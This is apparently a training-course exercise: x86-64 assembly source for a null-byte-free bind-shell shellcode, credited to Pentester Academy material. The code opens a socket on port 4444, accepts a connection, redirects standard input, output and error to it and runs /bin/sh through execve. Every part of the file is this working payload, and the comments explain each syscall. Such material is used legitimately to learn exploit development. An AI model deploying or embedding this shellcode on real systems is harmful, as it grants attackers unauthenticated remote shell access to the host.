# This is the original code provided by pentester academy modified to remove null bytes
global _start

_start:

; sock = socket(AF_INET, SOCK_STREAM, 0)
; AF_INET = 2
; SOCK_STREAM = 1
; syscall number 41
;mov rax, 41
;mov rdi, 2
;mov rsi, 1
;mov rdx, 0
xor rax, rax                             ; Clear rax register
mov rdi, rax                             ; Clear rdi register
mov rsi, rax                             ; Clear rsi register
mov rdx, rax                             ; Clear rdx register

mov al, 41                               ; Move only a word
mov dil, 2                               ; Move only a word
mov sil, 1                               ; Move only a word
syscall

; copy socket descriptor to rdi for future use
mov rdi, rax

; server.sin_family = AF_INET
; server.sin_port = htons(PORT)
; server.sin_addr.s_addr = INADDR_ANY
; bzero(&server.sin_zero, 8)
xor rax, rax
push rax
mov dword [rsp-4], eax
mov word [rsp-6], 0x5c11
;mov word [rsp-8], 0x2
mov word [rsp-8], ax                     ; Set word to 0x0000
add byte [rsp-8], 0x2                    ; Add byte 0x02 -> 0x0002

sub rsp, 8

; bind(sock, (struct sockaddr *)&server, sockaddr_len)
; syscall number 49
;mov rax, 49
;mov rsi, rsp
;mov rdx, 16
xor rax, rax                             ; Clear rax register
mov rdx, rax                             ; Clear rdx register
mov al, 49                               ; Move only a word
mov dl, 16                               ; Move only a word
mov rsi, rsp
syscall

; listen(sock, MAX_CLIENTS)
; syscall number 50
;mov rax, 50
;mov rsi, 2
xor rax, rax                             ; Clear rax register
mov rsi, rax                             ; Clear rsi register
mov al, 50                               ; Move only a word
mov sil, 2                               ; Move only a word
syscall

; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
; syscall number 43
;mov rax, 43
xor rax, rax                             ; Clear rax register
mov al, 43                               ; Move only a word
sub rsp, 16
mov rsi, rsp
mov byte [rsp-1], 16
sub rsp, 1
mov rdx, rsp
syscall

; store the client socket description
mov r9, rax

; close parent
;mov rax, 3
xor rax, rax                             ; Clear rax register
mov al, 3                                ; Move only a word
syscall

; duplicate sockets
; dup2 (new, old)
mov rdi, r9
;mov rax, 33
;mov rsi, 0
xor rax, rax                             ; Clear rax register
mov rsi, rax                             ; Set rsi to 0
mov al, 33                               ; Move only a word
syscall

;mov rax, 33
;mov rsi, 1
xor rax, rax                             ; Clear rax register
mov rsi, rax                             ; Clear rsi register
mov al, 33                               ; Move only a word
inc rsi                                  ; Set rsi to 1
syscall

;mov rax, 33
;mov rsi, 2
xor rax, rax                             ; Clear rax register
mov rsi, rax                             ; Clear rsi register
mov al, 33                               ; Move only a word
mov sil, 2                               ; Set rsi to 2
syscall

; execve
; First NULL push
xor rax, rax
push rax

; push /bin//sh in reverse
mov rbx, 0x68732f2f6e69622f
push rbx

; store /bin//sh address in RDI
mov rdi, rsp

; Second NULL push
push rax

; set RDX
mov rdx, rsp

; Push address of /bin//sh
push rdi

; set RSI
mov rsi, rsp

; Call the Execve syscall
add rax, 59
syscall
